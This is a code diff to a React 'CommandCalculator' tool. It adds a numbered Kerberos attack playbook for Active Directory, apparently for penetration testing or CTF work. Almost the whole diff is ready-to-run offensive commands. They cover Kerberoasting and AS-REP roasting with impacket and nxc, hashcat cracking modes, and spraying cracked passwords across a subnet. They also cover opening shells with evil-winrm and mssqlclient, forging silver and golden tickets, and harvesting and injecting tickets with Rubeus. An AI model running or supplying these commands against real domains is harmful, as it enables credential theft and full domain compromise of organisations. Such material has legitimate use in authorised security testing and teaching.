@@ -362,25 +362,74 @@ export default function CommandCalculator() {
     },
     kerberos: {
       name: "Kerberos", groups: [
-        { phase: "Prereq — clock skew", cmds: [
-          { label: "Check drift vs DC", cmd: `ntpdate -q ${DCIP}`, note: "Kerberos rejects anything >5 min off the KDC. Check before you burn time debugging auth." },
-          { label: "faketime wrapper (no clock change)", cmd: `faketime "$(ntpdate -q ${DCIP} | awk '{print $1" "$2}')" \\\n  impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request -outputfile tgs.txt`, note: "Preferred — per-process only, leaves your system clock (and TLS) alone." },
-          { label: "Sync host clock to DC", cmd: `sudo timedatectl set-ntp 0\nsudo ntpdate -u ${DCIP}\ntimedatectl status`, note: "set-ntp 0 FIRST — timesyncd re-syncs within seconds otherwise and you'll think it failed." },
-          { label: "Restore NTP when done", cmd: `sudo timedatectl set-ntp 1`, note: "A desynced clock breaks cert validation — apt/pip/browser start erroring." },
+        { phase: "0 — Setup (do this first)", cmds: [
+          { label: "0.1  Map the DC in /etc/hosts", cmd: `echo "${DCIP} ${HOST}.${D} ${HOST} ${D}" | sudo tee -a /etc/hosts`, note: "Kerberos matches on hostname, never IP. Every later step breaks without this." },
+          { label: "0.2  Check clock drift vs the DC", cmd: `ntpdate -q ${DCIP}`, note: ">5 min off the KDC = every ticket request fails. 10 seconds here saves an hour." },
+          { label: "0.3  Fix skew — faketime (preferred)", cmd: `export FT="$(ntpdate -q ${DCIP} | awk '{print $1" "$2}')"\necho $FT`, note: "Set once, reuse as: faketime \"$FT\" <command>. Leaves your system clock and TLS alone." },
+          { label: "0.3b Fix skew — sync host clock", cmd: `sudo timedatectl set-ntp 0\nsudo ntpdate -u ${DCIP}\ntimedatectl status`, note: "set-ntp 0 FIRST or timesyncd undoes it in seconds. Restore later with set-ntp 1." },
         ]},
-        { phase: "Tickets", cmds: [
-          { label: "Request TGT", cmd: authMode === "hash"
-            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
-            : `impacket-getTGT ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
-          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=${U}.ccache\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}` },
-          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
+        { phase: "1 — Find targets (no tickets requested yet)", cmds: [
+          { label: "1.1  List SPN accounts (no -request)", cmd: authMode === "krb"
+            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U}`
+            : `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Enumeration only — runs over LDAP, no Kerberos, so it works even with bad clock skew. Read the Delegation column." },
+          { label: "1.2  SPN accounts → kerb_users.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee kerb_users.txt` },
+          { label: "1.3  AS-REP accounts → asrep_users.txt", cmd: `ldapsearch -x -LLL -o ldif-wrap=no -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName | awk '/^sAMAccountName:/ {print $2}' | sort -u | tee asrep_users.txt`, note: "DONT_REQ_PREAUTH accounts — roastable with no credentials at all." },
+          { label: "1.4  Machine accounts are NOT worth roasting", cmd: `# Skip any SPN owned by a name ending in $ — those are 120-char\n# random machine passwords. Only human-set service accounts crack.`, note: "Reading, not running. Saves you cracking a hash that will never fall." },
+        ]},
+        { phase: "2 — Request the hashes", cmds: [
+          { label: "2.1  Kerberoast — all SPNs", cmd: authMode === "krb"
+            ? `faketime "$FT" impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile tgs.txt`
+            : `faketime "$FT" impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request -outputfile tgs.txt`, note: "$FT comes from step 0.3. Drop the faketime prefix if your clock is already synced." },
+          { label: "2.2  Kerberoast — one account", cmd: `faketime "$FT" impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request-user sql_svc -outputfile tgs_sqlsvc.txt`, note: "Quieter, and lets you retry a single account without re-requesting everything." },
+          { label: "2.3  Kerberoast — nxc alternative", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting tgs.txt`, note: "Writes straight to file. Handy if impacket is misbehaving." },
+          { label: "2.4  AS-REP roast — from userlist", cmd: `faketime "$FT" impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile asrep_users.txt -no-pass -request -format hashcat -outputfile asrep.txt`, note: "-format hashcat or it writes john format and -m 18200 rejects it." },
+          { label: "2.5  AS-REP roast — nxc alternative", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
+        ]},
+        { phase: "3 — VERIFY you got hashes", cmds: [
+          { label: "3.1  Did the file get written?", cmd: `ls -l tgs.txt asrep.txt 2>/dev/null`, note: "THE step people skip. A clean-looking SPN table with no file means the ticket request failed — go back to step 0.2." },
+          { label: "3.2  Count the hashes", cmd: `grep -c 'krb5tgs' tgs.txt\ngrep -c 'krb5asrep' asrep.txt`, note: "Zero here means enumeration worked and roasting didn't. Not the same thing." },
+          { label: "3.3  Check the encryption type", cmd: `cut -d'$' -f2,3 tgs.txt | sort -u`, note: "23 = RC4 -> hashcat -m 13100. 18 = AES256 -> -m 19700. Wrong mode looks like 'no hashes loaded'." },
+        ]},
+        { phase: "4 — Crack", cmds: [
+          { label: "4.1  Kerberoast — straight rockyou", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt`, note: "Try this bare first. Service accounts set years ago fall in seconds." },
+          { label: "4.2  Kerberoast — with rules", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, note: "Rules missing? find / -name 'best64.rule' 2>/dev/null — otherwise: apt install --reinstall hashcat" },
+          { label: "4.3  AS-REP crack", cmd: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` },
+          { label: "4.4  AES-encrypted TGS (etype 18)", cmd: `hashcat -m 19700 tgs.txt /usr/share/wordlists/rockyou.txt`, note: "Only if step 3.3 showed 18. Much slower than RC4 — expect it." },
+          { label: "4.5  Show what cracked", cmd: `hashcat -m 13100 tgs.txt --show | awk -F: '{print $NF}'\nhashcat -m 13100 tgs.txt --show | sed 's/.*\\*\\([^$]*\\)\\$.*:/\\1:/'`, note: "Recovers results from the potfile without re-running the attack." },
+        ]},
+        { phase: "5 — Use the credential (do NOT skip)", cmds: [
+          { label: "5.1  Every service, every host", cmd: `for svc in smb winrm mssql rdp ssh; do\n  echo "=== $svc ==="\n  nxc $svc ${IP} -u <CRACKED_USER> -p '<CRACKED_PASS>' -d ${D} 2>/dev/null | grep -F '[+]'\ndone`, note: "The single highest-value step in this whole list. Do it before any further technique." },
+          { label: "5.2  Try for an interactive shell", cmd: `evil-winrm -i ${HOST}.${D} -u <CRACKED_USER> -p '<CRACKED_PASS>'\nimpacket-mssqlclient ${D}/<CRACKED_USER>:'<CRACKED_PASS>'@${IP} -windows-auth`, note: "No (Pwn3d!) does NOT mean no access — WinRM and MSSQL rights are invisible to that check." },
+          { label: "5.3  Spray it at every account", cmd: `nxc smb ${SUBNET} -u users.txt -p '<CRACKED_PASS>' --continue-on-success | grep -F '[+]'`, note: "Admins reuse service account passwords constantly." },
+          { label: "5.4  Re-run BloodHound as the new user", cmd: `bloodhound-python -u <CRACKED_USER> -p '<CRACKED_PASS>' -d ${D} -ns ${DCIP} -c All --zip`, note: "New identity can see graph edges the old one couldn't." },
+        ]},
+        { phase: "6 — If it won't crack", cmds: [
+          { label: "6.1  Bigger wordlist / heavier rules", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`, note: "Long shot on a laptop CPU. Time-box it and keep enumerating in parallel." },
+          { label: "6.2  Silver ticket — no cracking needed", cmd: `impacket-ticketer -nthash <NTHASH_OF_SVC_ACCT> -domain-sid <DOMAIN_SID> -domain ${D} -spn <SERVICE>/<HOST>.${D} Administrator\nexport KRB5CCNAME=$PWD/Administrator.ccache`, note: "Only works for the service that account OWNS. WinRM and CIFS belong to the MACHINE account, not a user — check who holds the SPN first." },
+          { label: "6.3  Check delegation on the SPN account", cmd: `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} | awk '{print $NF}'`, note: "An unconstrained/constrained delegation flag is a bigger win than the password." },
+          { label: "6.4  Move on", cmd: `# Uncrackable service account is a dead end, not a puzzle.\n# Go back to BloodHound ACLs, shares, and the web app.`, note: "Reading, not running. Roasting is one branch, not the path." },
+        ]},
+        { phase: "7 — Error decoder", cmds: [
+          { label: "KRB_AP_ERR_SKEW", cmd: `ntpdate -q ${DCIP}`, note: "Clock skew. Back to step 0.2/0.3." },
+          { label: "CCache file is not found. Skipping...", cmd: `# Harmless. Impacket checks for KRB5CCNAME, finds none,\n# falls back to your password. Not an error.`, note: "Reading, not running. Everyone panics at this line once." },
+          { label: "No hashes, no outputfile, clean SPN table", cmd: `ls -l tgs.txt`, note: "Enumeration is LDAP, roasting is Kerberos. The table succeeding proves nothing about the request." },
+          { label: "KDC_ERR_ETYPE_NOTSUPP", cmd: `cat /etc/krb5.conf | grep -i enctype`, note: "RC4 disabled on the DC or on your client. Add rc4-hmac to permitted_enctypes, or roast for AES and use -m 19700." },
+          { label: "hashcat: No hashes loaded", cmd: `head -c 60 tgs.txt\ncut -d'$' -f2,3 tgs.txt | sort -u`, note: "Wrong -m for the etype, or the file holds john format instead of hashcat format." },
         ]},
         { phase: "Rubeus (on a Windows foothold)", cmds: [
           { label: "Kerberoast → hashes", cmd: `.\\Rubeus.exe kerberoast /nowrap /outfile:tgs.txt`, note: "Crack with hashcat -m 13100." },
+          { label: "Kerberoast — stats only", cmd: `.\\Rubeus.exe kerberoast /stats`, note: "Shows how many roastable accounts exist and their password-set dates. Old dates crack." },
           { label: "AS-REP roast", cmd: `.\\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:asrep.txt` },
           { label: "Dump + monitor TGTs", cmd: `.\\Rubeus.exe triage\n.\\Rubeus.exe monitor /interval:5 /nowrap`, note: "monitor harvests tickets as users log in." },
           { label: "Pass-the-ticket (inject)", cmd: `.\\Rubeus.exe ptt /ticket:BASE64_OR_KIRBI`, note: "Inject a stolen/forged ticket into the current session." },
           { label: "Overpass-the-hash → TGT", cmd: `.\\Rubeus.exe asktgt /user:${U} /rc4:${SEC} /ptt`, note: "Turn an NT hash into a usable TGT in-session." },
+        ]},
+        { phase: "Other tickets", cmds: [
+          { label: "Request TGT", cmd: authMode === "hash"
+            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
+            : `impacket-getTGT ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
+          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=$PWD/${U}.ccache\nklist\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}`, note: "Use an ABSOLUTE path — a relative KRB5CCNAME breaks the moment you cd." },
+          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
         ]},
       ],
     },
